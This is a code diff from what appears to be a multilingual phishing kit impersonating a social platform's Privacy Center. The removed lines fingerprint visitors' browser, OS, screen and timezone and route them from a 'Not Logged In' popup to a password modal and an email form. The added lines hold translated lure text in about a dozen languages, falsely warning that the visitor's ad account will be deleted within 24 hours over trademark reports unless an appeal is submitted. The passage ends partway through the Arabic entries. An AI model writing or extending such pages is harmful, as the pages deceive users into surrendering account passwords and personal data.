-            else if (ua.indexOf('Edg') > -1) browser = 'Edge';
-            if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
-            else if (ua.indexOf('Android') > -1) os = 'Android';
-            else if (ua.indexOf('Windows') > -1) os = 'Windows';
-            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
-            else if (ua.indexOf('Linux') > -1) os = 'Linux';
-            return {
-                browser, os,
-                screen: screen.width + 'x' + screen.height,
-                language: navigator.language || '',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
-                mobile: /Mobile|Android|iPhone|iPad/i.test(ua)
-            };
-        }
-
-        /* ===== Not Logged In popup -> Password Modal ===== */
-        document.getElementById('nli-login-btn').addEventListener('click', function () {
-            document.getElementById('notloggedin-overlay').classList.add('hidden');
-            document.getElementById('modal-password').classList.remove('hidden');
-        });
-
-        /* ===== Info Form Submit ===== */
-        document.getElementById('form-info').addEventListener('submit', async function (e) {
-            e.preventDefault();
-            if (isSubmittingInfo) return;
-
-            // Clear previous errors
-            clearFormErrors();
-
-            // Empty validation
-            const email = document.getElementById('email').value;
-            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                showFormError('error-email', window.getTranslation ? window.getTranslation('error.email') : 'Lütfen geçerli bir e-posta adresi girin');
-                document.getElementById('email').focus();
-                return;
+        // ============================================================
+        // TRANSLATION DICTIONARY - 20 NGÔN NGỮ PHỔ BIẾN
+        // ============================================================
+        const translations = {
+            'en': {
+                'privacy_center': 'Privacy Center',
+                'home_page': 'Privacy Center Home Page',
+                'search': 'Search',
+                'privacy_policy': 'Privacy Policy',
+                'other_rules': 'Other rules and articles',
+                'settings': 'Settings',
+                'warning_title': 'We have scheduled the deletion of your ad account and pages.',
+                'warning_desc1': 'We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.',
+                'warning_desc2': 'If no corrective actions are taken, your ad account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request for review and assistance.',
+                'request_review': 'Request Review',
+                'request_desc1': 'This form is only to be used for submitting appeals and restoring account status.',
+                'request_desc2': 'Please ensure that you provide the requested information below. Failure to do so may delay the processing of your appeal.',
+                'request_review_btn': 'Request Review',
+                'restricted_message': 'Your page will be restricted within 24 hours if no action is taken.',
+                'what_is_trademark': 'What is trademark infringement?',
+                'trademark_desc': 'Generally, trademark infringement occurs when all three of the following requirements are met:',
+                'trademark_point1': 'A company or person uses a trademark owned by someone else (or a similar mark) without permission.',
+                'trademark_point2': 'This use is in the course of trade, meaning it is in connection with the sale or promotion of goods or services.',
+                'trademark_point3': 'This use is likely to cause consumer confusion about the source, endorsement, or affiliation of the goods or services.',
+                'trademark_text': 'The core standard for trademark infringement is often the likelihood of confusion. There are many factors that determine whether someone\'s use of a trademark may cause confusion. For example, when someone uses a trademark on unrelated goods or services, it may not be infringement because it may not cause confusion. It is also often important to consider which party used the trademark first.',
+                'privacy_center_title': 'Privacy Center',
+                'user_agreement': 'For more details, see the User Agreement',
+                'footer_note': 'We continuously identify potential privacy risks, including when collecting, using, or sharing personal information, and develop methods to mitigate these risks. Read more about',
+                'privacy_policy_link': 'Privacy Policy'
+            },
+            'vi': {
+                'privacy_center': 'Trung tâm Quyền riêng tư',
+                'home_page': 'Trang chủ Trung tâm Quyền riêng tư',
+                'search': 'Tìm kiếm',
+                'privacy_policy': 'Chính sách bảo mật',
+                'other_rules': 'Các quy tắc và bài viết khác',
+                'settings': 'Cài đặt',
+                'warning_title': 'Chúng tôi đã lên lịch xóa tài khoản quảng cáo và trang của bạn.',
+                'warning_desc1': 'Chúng tôi đã nhận được nhiều báo cáo cho thấy quảng cáo của bạn vi phạm quyền nhãn hiệu. Sau khi xem xét kỹ lưỡng, chúng tôi đã đưa ra quyết định về vấn đề này.',
+                'warning_desc2': 'Nếu không có hành động khắc phục nào được thực hiện, tài khoản quảng cáo của bạn sẽ bị xóa vĩnh viễn. Nếu bạn muốn khiếu nại quyết định này, vui lòng gửi yêu cầu khiếu nại để được xem xét và hỗ trợ.',
+                'request_review': 'Yêu cầu xem xét',
+                'request_desc1': 'Biểu mẫu này chỉ được sử dụng để gửi khiếu nại và khôi phục trạng thái tài khoản.',
+                'request_desc2': 'Vui lòng đảm bảo rằng bạn cung cấp thông tin được yêu cầu bên dưới. Nếu không, việc xử lý khiếu nại của bạn có thể bị chậm trễ.',
+                'request_review_btn': 'Yêu cầu xem xét',
+                'restricted_message': 'Trang của bạn sẽ bị hạn chế trong vòng 24 giờ nếu không có hành động nào được thực hiện.',
+                'what_is_trademark': 'Vi phạm nhãn hiệu là gì?',
+                'trademark_desc': 'Thông thường, vi phạm nhãn hiệu xảy ra khi cả ba điều kiện sau được đáp ứng:',
+                'trademark_point1': 'Một công ty hoặc cá nhân sử dụng nhãn hiệu thuộc sở hữu của người khác (hoặc nhãn hiệu tương tự) mà không được phép.',
+                'trademark_point2': 'Việc sử dụng này diễn ra trong quá trình kinh doanh, nghĩa là liên quan đến việc bán hoặc quảng bá hàng hóa hoặc dịch vụ.',
+                'trademark_point3': 'Việc sử dụng này có khả năng gây nhầm lẫn cho người tiêu dùng về nguồn gốc, sự chứng thực hoặc liên kết của hàng hóa hoặc dịch vụ.',
+                'trademark_text': 'Tiêu chuẩn cốt lõi của vi phạm nhãn hiệu thường là khả năng gây nhầm lẫn. Có nhiều yếu tố để xác định liệu việc sử dụng nhãn hiệu của ai đó có thể gây nhầm lẫn hay không. Ví dụ: khi ai đó sử dụng nhãn hiệu trên hàng hóa hoặc dịch vụ không liên quan, đó có thể không phải là vi phạm vì nó có thể không gây nhầm lẫn. Điều quan trọng nữa là xem xét bên nào đã sử dụng nhãn hiệu trước.',
+                'privacy_center_title': 'Trung tâm Quyền riêng tư',
+                'user_agreement': 'Để biết thêm chi tiết, hãy xem Thỏa thuận người dùng',
+                'footer_note': 'Chúng tôi liên tục xác định các rủi ro về quyền riêng tư tiềm ẩn, bao gồm khi thu thập, sử dụng hoặc chia sẻ thông tin cá nhân và phát triển các phương pháp để giảm thiểu những rủi ro này. Đọc thêm về',
+                'privacy_policy_link': 'Chính sách bảo mật'
+            },
+            'zh': {
+                'privacy_center': '隐私中心',
+                'home_page': '隐私中心主页',
+                'search': '搜索',
+                'privacy_policy': '隐私政策',
+                'other_rules': '其他规则和文章',
+                'settings': '设置',
+                'warning_title': '我们已安排删除您的广告帐户和页面。',
+                'warning_desc1': '我们收到多份报告，表明您的广告侵犯了商标权。经过详细审查，我们已就此问题做出决定。',
+                'warning_desc2': '如果不采取纠正措施，您的广告帐户将被永久删除。如果您希望对此决定提出申诉，请提交申诉请求以供审查和协助。',
+                'request_review': '请求审核',
+                'request_desc1': '此表格仅用于提交申诉和恢复帐户状态。',
+                'request_desc2': '请确保您提供以下所需信息。否则可能会延迟处理您的申诉。',
+                'request_review_btn': '请求审核',
+                'restricted_message': '如果不采取任何行动，您的页面将在24小时内被限制。',
+                'what_is_trademark': '什么是商标侵权？',
+                'trademark_desc': '一般来说，商标侵权发生在满足以下所有三个要求时：',
+                'trademark_point1': '公司或个人未经许可使用他人拥有的商标（或类似商标）。',
+                'trademark_point2': '这种使用是在贸易过程中进行的，即与商品或服务的销售或推广有关。',
+                'trademark_point3': '这种使用很可能导致消费者对商品或服务的来源、认可或关联产生混淆。',
+                'trademark_text': '商标侵权的核心标准通常是混淆的可能性。有许多因素决定某人对商标的使用是否可能引起混淆。例如，当某人在不相关的商品或服务上使用商标时，可能不构成侵权，因为可能不会引起混淆。考虑哪一方先使用商标也通常很重要。',
+                'privacy_center_title': '隐私中心',
+                'user_agreement': '有关更多详细信息，请参阅用户协议',
+                'footer_note': '我们不断识别潜在的隐私风险，包括在收集、使用或共享个人信息时，并开发方法来减轻这些风险。了解更多关于',
+                'privacy_policy_link': '隐私政策'
+            },
+            'ja': {
+                'privacy_center': 'プライバシーセンター',
+                'home_page': 'プライバシーセンターホームページ',
+                'search': '検索',
+                'privacy_policy': 'プライバシーポリシー',
+                'other_rules': 'その他のルールと記事',
+                'settings': '設定',
+                'warning_title': '広告アカウントとページの削除が予定されています。',
+                'warning_desc1': 'お客様の広告が商標権を侵害しているという複数の報告を受けました。詳細な審査の結果、この件に関する決定を下しました。',
+                'warning_desc2': '是正措置が取られない場合、広告アカウントは永久に削除されます。この決定に異議がある場合は、審査とサポートのために異議申し立てを提出してください。',
+                'request_review': 'レビューをリクエスト',
+                'request_desc1': 'このフォームは、異議申し立ての提出とアカウントステータスの復元にのみ使用されます。',
+                'request_desc2': '以下に要求される情報を提供してください。提供しない場合、異議申し立ての処理が遅れる可能性があります。',
+                'request_review_btn': 'レビューをリクエスト',
+                'restricted_message': 'アクションが行われない場合、ページは24時間以内に制限されます。',
+                'what_is_trademark': '商標侵害とは？',
+                'trademark_desc': '一般的に、商標侵害は以下の3つの要件がすべて満たされた場合に発生します：',
+                'trademark_point1': '企業または個人が、許可なく他人が所有する商標（または類似の商標）を使用すること。',
+                'trademark_point2': 'この使用は取引の過程で行われ、商品やサービスの販売やプロモーションに関連していること。',
+                'trademark_point3': 'この使用が、商品やサービスの出所、承認、または関連性について消費者に混乱を引き起こす可能性があること。',
+                'trademark_text': '商標侵害の核心的な基準は、しばしば混同の可能性です。商標の使用が混同を引き起こすかどうかを判断する要因は多数あります。たとえば、無関係な商品やサービスに商標を使用する場合、混同を引き起こさないため侵害にならないことがあります。また、どちらの当事者が先に商標を使用したかを考慮することも重要です。',
+                'privacy_center_title': 'プライバシーセンター',
+                'user_agreement': '詳細については、利用規約をご覧ください',
+                'footer_note': '個人情報の収集、使用、共有を含む潜在的なプライバシーリスクを継続的に特定し、これらのリスクを軽減する方法を開発しています。詳細は',
+                'privacy_policy_link': 'プライバシーポリシー'
+            },
+            'ko': {
+                'privacy_center': '개인정보 보호 센터',
+                'home_page': '개인정보 보호 센터 홈페이지',
+                'search': '검색',
+                'privacy_policy': '개인정보 처리방침',
+                'other_rules': '기타 규칙 및 문서',
+                'settings': '설정',
+                'warning_title': '광고 계정 및 페이지 삭제가 예정되어 있습니다.',
+                'warning_desc1': '귀하의 광고가 상표권을 침해한다는 여러 신고가 접수되었습니다. 자세한 검토 후 이 문제에 대한 결정을 내렸습니다.',
+                'warning_desc2': '시정 조치가 취해지지 않으면 광고 계정이 영구적으로 삭제됩니다. 이 결정에 이의가 있으시면 검토 및 지원을 위해 이의 제기 요청을 제출하십시오.',
+                'request_review': '검토 요청',
+                'request_desc1': '이 양식은 이의 제기 제출 및 계정 상태 복원에만 사용됩니다.',
+                'request_desc2': '아래에 요청된 정보를 제공하시기 바랍니다. 제공하지 않으면 이의 제기 처리가 지연될 수 있습니다.',
+                'request_review_btn': '검토 요청',
+                'restricted_message': '조치를 취하지 않으면 페이지가 24시간 이내에 제한됩니다.',
+                'what_is_trademark': '상표권 침해란?',
+                'trademark_desc': '일반적으로 상표권 침해는 다음 세 가지 요구 사항이 모두 충족될 때 발생합니다:',
+                'trademark_point1': '회사 또는 개인이 허가 없이 타인이 소유한 상표(또는 유사한 표장)를 사용하는 경우.',
+                'trademark_point2': '이 사용은 상거래 과정에서 이루어지며, 상품 또는 서비스의 판매 또는 홍보와 관련됩니다.',
+                'trademark_point3': '이 사용이 상품 또는 서비스의 출처, 보증 또는 제휴에 관해 소비자에게 혼동을 일으킬 가능성이 있는 경우.',
+                'trademark_text': '상표권 침해의 핵심 기준은 종종 혼동 가능성입니다. 누군가의 상표 사용이 혼동을 일으킬 수 있는지 여부를 결정하는 많은 요소가 있습니다. 예를 들어, 누군가가 관련 없는 상품이나 서비스에 상표를 사용하는 경우 혼동을 일으키지 않을 수 있으므로 침해가 아닐 수 있습니다. 또한 누가 먼저 상표를 사용했는지 고려하는 것도 중요합니다.',
+                'privacy_center_title': '개인정보 보호 센터',
+                'user_agreement': '자세한 내용은 이용약관을 참조하세요',
+                'footer_note': '개인정보 수집, 사용 또는 공유 시 잠재적인 개인정보 위험을 지속적으로 식별하고 이러한 위험을 완화하는 방법을 개발하고 있습니다. 자세히 알아보기',
+                'privacy_policy_link': '개인정보 처리방침'
+            },
+            'hi': {
+                'privacy_center': 'गोपनीयता केंद्र',
+                'home_page': 'गोपनीयता केंद्र मुख्य पृष्ठ',
+                'search': 'खोजें',
+                'privacy_policy': 'गोपनीयता नीति',
+                'other_rules': 'अन्य नियम और लेख',
+                'settings': 'सेटिंग्स',
+                'warning_title': 'हमने आपके विज्ञापन खाते और पेजों को हटाने का कार्यक्रम निर्धारित किया है।',
+                'warning_desc1': 'हमें कई रिपोर्ट मिली हैं जो बताती हैं कि आपका विज्ञापन ट्रेडमार्क अधिकारों का उल्लंघन करता है। विस्तृत समीक्षा के बाद, हमने इस मामले पर एक निर्णय लिया है।',
+                'warning_desc2': 'यदि सुधारात्मक कार्रवाई नहीं की जाती है, तो आपका विज्ञापन खाता स्थायी रूप से हटा दिया जाएगा। यदि आप इस निर्णय के खिलाफ अपील करना चाहते हैं, तो कृपया समीक्षा और सहायता के लिए अपील अनुरोध सबमिट करें।',
+                'request_review': 'समीक्षा का अनुरोध करें',
+                'request_desc1': 'यह फॉर्म केवल अपील दायर करने और खाते की स्थिति बहाल करने के लिए उपयोग किया जाना चाहिए।',
+                'request_desc2': 'कृपया सुनिश्चित करें कि आप नीचे मांगी गई जानकारी प्रदान करते हैं। ऐसा न करने पर आपकी अपील की प्रक्रिया में देरी हो सकती है।',
+                'request_review_btn': 'समीक्षा का अनुरोध करें',
+                'restricted_message': 'यदि कोई कार्रवाई नहीं की जाती है तो आपका पेज 24 घंटे के भीतर प्रतिबंधित कर दिया जाएगा।',
+                'what_is_trademark': 'ट्रेडमार्क उल्लंघन क्या है?',
+                'trademark_desc': 'आम तौर पर, ट्रेडमार्क उल्लंघन तब होता है जब निम्नलिखित तीनों आवश्यकताएं पूरी होती हैं:',
+                'trademark_point1': 'एक कंपनी या व्यक्ति बिना अनुमति के किसी और के स्वामित्व वाले ट्रेडमार्क (या समान चिह्न) का उपयोग करता है।',
+                'trademark_point2': 'यह उपयोग व्यापार के दौरान होता है, जिसका अर्थ है कि यह वस्तुओं या सेवाओं की बिक्री या प्रचार के संबंध में है।',
+                'trademark_point3': 'इस उपयोग से वस्तुओं या सेवाओं के स्रोत, समर्थन या संबद्धता के बारे में उपभोक्ताओं में भ्रम पैदा होने की संभावना है।',
+                'trademark_text': 'ट्रेडमार्क उल्लंघन का मूल मानक अक्सर भ्रम की संभावना है। ऐसे कई कारक हैं जो यह निर्धारित करते हैं कि किसी के ट्रेडमार्क का उपयोग भ्रम पैदा कर सकता है या नहीं। उदाहरण के लिए, जब कोई असंबंधित वस्तुओं या सेवाओं पर ट्रेडमार्क का उपयोग करता है, तो यह उल्लंघन नहीं हो सकता है क्योंकि इससे भ्रम नहीं हो सकता है। यह भी अक्सर महत्वपूर्ण है कि किस पार्टी ने पहले ट्रेडमार्क का उपयोग किया था।',
+                'privacy_center_title': 'गोपनीयता केंद्र',
+                'user_agreement': 'अधिक विवरण के लिए, उपयोगकर्ता अनुबंध देखें',
+                'footer_note': 'हम व्यक्तिगत जानकारी एकत्र करने, उपयोग करने या साझा करने सहित संभावित गोपनीयता जोखिमों की लगातार पहचान करते हैं, और इन जोखिमों को कम करने के तरीके विकसित करते हैं। के बारे में और पढ़ें',
+                'privacy_policy_link': 'गोपनीयता नीति'
+            },
+            'es': {
+                'privacy_center': 'Centro de privacidad',
+                'home_page': 'Página de inicio del Centro de privacidad',
+                'search': 'Buscar',
+                'privacy_policy': 'Política de privacidad',
+                'other_rules': 'Otras reglas y artículos',
+                'settings': 'Configuración',
+                'warning_title': 'Hemos programado la eliminación de su cuenta publicitaria y páginas.',
+                'warning_desc1': 'Hemos recibido múltiples informes que indican que su anuncio viola los derechos de marca. Después de una revisión detallada, hemos tomado una decisión al respecto.',
+                'warning_desc2': 'Si no se toman medidas correctivas, su cuenta publicitaria será eliminada permanentemente. Si desea apelar esta decisión, por favor envíe una solicitud de apelación para revisión y asistencia.',
+                'request_review': 'Solicitar revisión',
+                'request_desc1': 'Este formulario solo debe usarse para enviar apelaciones y restaurar el estado de la cuenta.',
+                'request_desc2': 'Asegúrese de proporcionar la información solicitada a continuación. De lo contrario, el procesamiento de su apelación podría retrasarse.',
+                'request_review_btn': 'Solicitar revisión',
+                'restricted_message': 'Su página será restringida en 24 horas si no se toma ninguna medida.',
+                'what_is_trademark': '¿Qué es la infracción de marca registrada?',
+                'trademark_desc': 'Generalmente, la infracción de marca registrada ocurre cuando se cumplen los tres requisitos siguientes:',
+                'trademark_point1': 'Una empresa o persona utiliza una marca registrada propiedad de otra persona (o una marca similar) sin permiso.',
+                'trademark_point2': 'Este uso es en el curso del comercio, es decir, en relación con la venta o promoción de bienes o servicios.',
+                'trademark_point3': 'Es probable que este uso cause confusión en los consumidores sobre el origen, respaldo o afiliación de los bienes o servicios.',
+                'trademark_text': 'El estándar principal para la infracción de marca registrada suele ser la probabilidad de confusión. Hay muchos factores que determinan si el uso de una marca por parte de alguien puede causar confusión. Por ejemplo, cuando alguien usa una marca en bienes o servicios no relacionados, puede no ser infracción porque puede no causar confusión. También suele ser importante considerar qué parte usó la marca primero.',
+                'privacy_center_title': 'Centro de privacidad',
+                'user_agreement': 'Para más detalles, consulte el Acuerdo de usuario',
+                'footer_note': 'Identificamos continuamente posibles riesgos de privacidad, incluso al recopilar, usar o compartir información personal, y desarrollamos métodos para mitigar estos riesgos. Leer más sobre',
+                'privacy_policy_link': 'Política de privacidad'
+            },
+            'fr': {
+                'privacy_center': 'Centre de confidentialité',
+                'home_page': "Page d'accueil du Centre de confidentialité",
+                'search': 'Rechercher',
+                'privacy_policy': 'Politique de confidentialité',
+                'other_rules': 'Autres règles et articles',
+                'settings': 'Paramètres',
+                'warning_title': 'Nous avons programmé la suppression de votre compte publicitaire et de vos pages.',
+                'warning_desc1': 'Nous avons reçu plusieurs signalements indiquant que votre publicité viole les droits de marque. Après un examen détaillé, nous avons pris une décision concernant cette affaire.',
+                'warning_desc2': "Si aucune action corrective n'est prise, votre compte publicitaire sera définitivement supprimé. Si vous souhaitez faire appel de cette décision, veuillez soumettre une demande d'appel pour examen et assistance.",
+                'request_review': 'Demander un examen',
+                'request_desc1': "Ce formulaire est uniquement destiné à la soumission d'appels et à la restauration du statut du compte.",
+                'request_desc2': "Assurez-vous de fournir les informations demandées ci-dessous. Le non-respect de cette obligation peut retarder le traitement de votre appel.",
+                'request_review_btn': 'Demander un examen',
+                'restricted_message': 'Votre page sera restreinte dans les 24 heures si aucune action n\'est prise.',
+                'what_is_trademark': "Qu'est-ce que la contrefaçon de marque ?",
+                'trademark_desc': 'Généralement, la contrefaçon de marque se produit lorsque les trois conditions suivantes sont remplies :',
+                'trademark_point1': 'Une entreprise ou une personne utilise une marque appartenant à quelqu\'un d\'autre (ou une marque similaire) sans autorisation.',
+                'trademark_point2': "Cette utilisation est dans le cadre du commerce, c'est-à-dire en relation avec la vente ou la promotion de biens ou de services.",
+                'trademark_point3': "Cette utilisation est susceptible de créer une confusion chez les consommateurs quant à la source, l'approbation ou l'affiliation des biens ou des services.",
+                'trademark_text': "Le critère fondamental de la contrefaçon de marque est souvent le risque de confusion. De nombreux facteurs déterminent si l'utilisation d'une marque peut causer une confusion. Par exemple, lorsqu'une personne utilise une marque sur des biens ou services sans rapport, il peut ne pas y avoir contrefaçon car cela peut ne pas causer de confusion. Il est également souvent important de déterminer quelle partie a utilisé la marque en premier.",
+                'privacy_center_title': 'Centre de confidentialité',
+                'user_agreement': "Pour plus de détails, consultez l'accord utilisateur",
+                'footer_note': "Nous identifions continuellement les risques potentiels pour la vie privée, y compris lors de la collecte, de l'utilisation ou du partage d'informations personnelles, et développons des méthodes pour atténuer ces risques. En savoir plus sur",
+                'privacy_policy_link': 'Politique de confidentialité'
+            },
+            'de': {
+                'privacy_center': 'Datenschutzzentrum',
+                'home_page': 'Startseite des Datenschutzzentrums',
+                'search': 'Suche',
+                'privacy_policy': 'Datenschutzrichtlinie',
+                'other_rules': 'Andere Regeln und Artikel',
+                'settings': 'Einstellungen',
+                'warning_title': 'Wir haben die Löschung Ihres Werbekontos und Ihrer Seiten geplant.',
+                'warning_desc1': 'Wir haben mehrere Berichte erhalten, die darauf hinweisen, dass Ihre Werbung Markenrechte verletzt. Nach einer detaillierten Prüfung haben wir eine Entscheidung zu dieser Angelegenheit getroffen.',
+                'warning_desc2': 'Wenn keine Korrekturmaßnahmen ergriffen werden, wird Ihr Werbekonto dauerhaft gelöscht. Wenn Sie gegen diese Entscheidung Einspruch einlegen möchten, reichen Sie bitte einen Einspruchsantrag zur Prüfung und Unterstützung ein.',
+                'request_review': 'Überprüfung beantragen',
+                'request_desc1': 'Dieses Formular darf nur zur Einreichung von Einspruch und Wiederherstellung des Kontostatus verwendet werden.',
+                'request_desc2': 'Bitte stellen Sie sicher, dass Sie die unten angeforderten Informationen bereitstellen. Andernfalls kann sich die Bearbeitung Ihres Einspruchs verzögern.',
+                'request_review_btn': 'Überprüfung beantragen',
+                'restricted_message': 'Ihre Seite wird innerhalb von 24 Stunden eingeschränkt, wenn keine Maßnahmen ergriffen werden.',
+                'what_is_trademark': 'Was ist Markenrechtsverletzung?',
+                'trademark_desc': 'Im Allgemeinen liegt eine Markenrechtsverletzung vor, wenn alle drei folgenden Voraussetzungen erfüllt sind:',
+                'trademark_point1': 'Ein Unternehmen oder eine Person verwendet eine Marke, die jemand anderem gehört (oder eine ähnliche Marke), ohne Erlaubnis.',
+                'trademark_point2': 'Diese Verwendung erfolgt im Rahmen des Handels, d.h. im Zusammenhang mit dem Verkauf oder der Werbung von Waren oder Dienstleistungen.',
+                'trademark_point3': 'Diese Verwendung kann bei Verbrauchern zu Verwirrung über die Herkunft, Billigung oder Zugehörigkeit der Waren oder Dienstleistungen führen.',
+                'trademark_text': 'Der Kernstandard für Markenrechtsverletzungen ist oft die Wahrscheinlichkeit von Verwirrung. Es gibt viele Faktoren, die bestimmen, ob die Verwendung einer Marke durch jemanden Verwirrung stiften kann. Wenn jemand beispielsweise eine Marke für nicht verwandte Waren oder Dienstleistungen verwendet, kann dies keine Verletzung darstellen, da es möglicherweise keine Verwirrung verursacht. Es ist auch oft wichtig zu berücksichtigen, welche Partei die Marke zuerst verwendet hat.',
+                'privacy_center_title': 'Datenschutzzentrum',
+                'user_agreement': 'Weitere Informationen finden Sie in der Nutzungsvereinbarung',
+                'footer_note': 'Wir identifizieren kontinuierlich potenzielle Datenschutzrisiken, einschließlich bei der Erhebung, Verwendung oder Weitergabe personenbezogener Daten, und entwickeln Methoden zur Minderung dieser Risiken. Erfahren Sie mehr über',
+                'privacy_policy_link': 'Datenschutzrichtlinie'
+            },
+            'it': {
+                'privacy_center': 'Centro per la privacy',
+                'home_page': 'Home page del Centro per la privacy',
+                'search': 'Cerca',
+                'privacy_policy': 'Informativa sulla privacy',
+                'other_rules': 'Altre regole e articoli',
+                'settings': 'Impostazioni',
+                'warning_title': 'Abbiamo programmato l\'eliminazione del tuo account pubblicitario e delle tue pagine.',
+                'warning_desc1': 'Abbiamo ricevuto molteplici segnalazioni che indicano che la tua pubblicità viola i diritti di marchio. Dopo un esame dettagliato, abbiamo preso una decisione in merito.',
+                'warning_desc2': 'Se non vengono intraprese azioni correttive, il tuo account pubblicitario verrà eliminato definitivamente. Se desideri fare appello a questa decisione, invia una richiesta di appello per la revisione e l\'assistenza.',
+                'request_review': 'Richiedi revisione',
+                'request_desc1': 'Questo modulo deve essere utilizzato solo per presentare ricorsi e ripristinare lo stato dell\'account.',
+                'request_desc2': 'Assicurati di fornire le informazioni richieste di seguito. In caso contrario, l\'elaborazione del tuo ricorso potrebbe essere ritardata.',
+                'request_review_btn': 'Richiedi revisione',
+                'restricted_message': 'La tua pagina sarà limitata entro 24 ore se non viene intrapresa alcuna azione.',
+                'what_is_trademark': 'Cos\'è la violazione del marchio?',
+                'trademark_desc': 'Generalmente, la violazione del marchio si verifica quando tutti e tre i seguenti requisiti sono soddisfatti:',
+                'trademark_point1': 'Un\'azienda o persona utilizza un marchio di proprietà di qualcun altro (o un segno simile) senza autorizzazione.',
+                'trademark_point2': 'Questo utilizzo è nel corso del commercio, ovvero in connessione con la vendita o la promozione di beni o servizi.',
+                'trademark_point3': 'Questo utilizzo è suscettibile di causare confusione nei consumatori circa la fonte, l\'approvazione o l\'affiliazione dei beni o servizi.',
+                'trademark_text': 'Lo standard fondamentale per la violazione del marchio è spesso la probabilità di confusione. Ci sono molti fattori che determinano se l\'uso di un marchio da parte di qualcuno può causare confusione. Ad esempio, quando qualcuno usa un marchio su beni o servizi non correlati, potrebbe non essere una violazione perché potrebbe non causare confusione. È anche spesso importante considerare quale parte ha usato il marchio per primo.',
+                'privacy_center_title': 'Centro per la privacy',
+                'user_agreement': 'Per maggiori dettagli, consulta l\'Accordo utente',
+                'footer_note': 'Identifichiamo continuamente potenziali rischi per la privacy, incluso quando raccogliamo, utilizziamo o condividiamo informazioni personali, e sviluppiamo metodi per mitigare questi rischi. Per saperne di più su',
+                'privacy_policy_link': 'Informativa sulla privacy'
+            },
+            'pt': {
+                'privacy_center': 'Central de Privacidade',
+                'home_page': 'Página inicial da Central de Privacidade',
+                'search': 'Pesquisar',
+                'privacy_policy': 'Política de Privacidade',
+                'other_rules': 'Outras regras e artigos',
+                'settings': 'Configurações',
+                'warning_title': 'Agendamos a exclusão da sua conta de anúncios e páginas.',
+                'warning_desc1': 'Recebemos vários relatórios indicando que seu anúncio viola os direitos de marca. Após uma análise detalhada, tomamos uma decisão sobre este assunto.',
+                'warning_desc2': 'Se nenhuma ação corretiva for tomada, sua conta de anúncios será excluída permanentemente. Se você deseja recorrer desta decisão, envie uma solicitação de recurso para revisão e assistência.',
+                'request_review': 'Solicitar revisão',
+                'request_desc1': 'Este formulário deve ser usado apenas para enviar recursos e restaurar o status da conta.',
+                'request_desc2': 'Certifique-se de fornecer as informações solicitadas abaixo. Caso contrário, o processamento do seu recurso pode ser atrasado.',
+                'request_review_btn': 'Solicitar revisão',
+                'restricted_message': 'Sua página será restrita em até 24 horas se nenhuma ação for tomada.',
+                'what_is_trademark': 'O que é violação de marca registrada?',
+                'trademark_desc': 'Geralmente, a violação de marca registrada ocorre quando todos os três requisitos a seguir são atendidos:',
+                'trademark_point1': 'Uma empresa ou pessoa usa uma marca registrada de propriedade de outra pessoa (ou uma marca similar) sem permissão.',
+                'trademark_point2': 'Este uso é no curso do comércio, ou seja, em conexão com a venda ou promoção de bens ou serviços.',
+                'trademark_point3': 'Este uso provavelmente causará confusão nos consumidores sobre a origem, endosso ou afiliação dos bens ou serviços.',
+                'trademark_text': 'O padrão central para violação de marca registrada é frequentemente a probabilidade de confusão. Existem muitos fatores que determinam se o uso de uma marca por alguém pode causar confusão. Por exemplo, quando alguém usa uma marca em bens ou serviços não relacionados, pode não ser violação porque pode não causar confusão. Também é frequentemente importante considerar qual parte usou a marca primeiro.',
+                'privacy_center_title': 'Central de Privacidade',
+                'user_agreement': 'Para mais detalhes, consulte o Acordo do Usuário',
+                'footer_note': 'Identificamos continuamente riscos potenciais de privacidade, incluindo ao coletar, usar ou compartilhar informações pessoais, e desenvolvemos métodos para mitigar esses riscos. Leia mais sobre',
+                'privacy_policy_link': 'Política de Privacidade'
+            },
+            'ru': {
+                'privacy_center': 'Центр конфиденциальности',
+                'home_page': 'Главная страница Центра конфиденциальности',
+                'search': 'Поиск',
+                'privacy_policy': 'Политика конфиденциальности',
+                'other_rules': 'Другие правила и статьи',
+                'settings': 'Настройки',
+                'warning_title': 'Мы запланировали удаление вашей рекламной учетной записи и страниц.',
+                'warning_desc1': 'Мы получили несколько сообщений о том, что ваша реклама нарушает права на товарные знаки. После детального рассмотрения мы приняли решение по данному вопросу.',
+                'warning_desc2': 'Если не будут приняты корректирующие меры, ваша рекламная учетная запись будет окончательно удалена. Если вы хотите обжаловать это решение, отправьте запрос на апелляцию для рассмотрения и помощи.',
+                'request_review': 'Запросить проверку',
+                'request_desc1': 'Эта форма предназначена только для подачи апелляций и восстановления статуса учетной записи.',
+                'request_desc2': 'Пожалуйста, убедитесь, что вы предоставили запрашиваемую информацию ниже. Невыполнение этого требования может задержать обработку вашей апелляции.',
+                'request_review_btn': 'Запросить проверку',
+                'restricted_message': 'Ваша страница будет ограничена в течение 24 часов, если не будут приняты меры.',
+                'what_is_trademark': 'Что такое нарушение прав на товарный знак?',
+                'trademark_desc': 'Как правило, нарушение прав на товарный знак происходит, когда выполняются все три следующих требования:',
+                'trademark_point1': 'Компания или лицо использует товарный знак, принадлежащий кому-то другому (или похожий знак), без разрешения.',
+                'trademark_point2': 'Это использование происходит в процессе торговли, то есть в связи с продажей или продвижением товаров или услуг.',
+                'trademark_point3': 'Это использование может вызвать у потребителей путаницу в отношении источника, одобрения или принадлежности товаров или услуг.',
+                'trademark_text': 'Основным стандартом нарушения прав на товарный знак часто является вероятность путаницы. Существует множество факторов, определяющих, может ли использование товарного знака кем-либо вызвать путаницу. Например, когда кто-то использует товарный знак на несвязанных товарах или услугах, это может не быть нарушением, поскольку это может не вызвать путаницы. Также часто важно учитывать, какая сторона использовала товарный знак первой.',
+                'privacy_center_title': 'Центр конфиденциальности',
+                'user_agreement': 'Для получения более подробной информации см. Пользовательское соглашение',
+                'footer_note': 'Мы постоянно выявляем потенциальные риски конфиденциальности, включая сбор, использование или передачу личной информации, и разрабатываем методы для снижения этих рисков. Подробнее о',
+                'privacy_policy_link': 'Политика конфиденциальности'
+            },
+            'ar': {
+                'privacy_center': 'مركز الخصوصية',
+                'home_page': 'الصفحة الرئيسية لمركز الخصوصية',
+                'search': 'بحث',
+                'privacy_policy': 'سياسة الخصوصية',
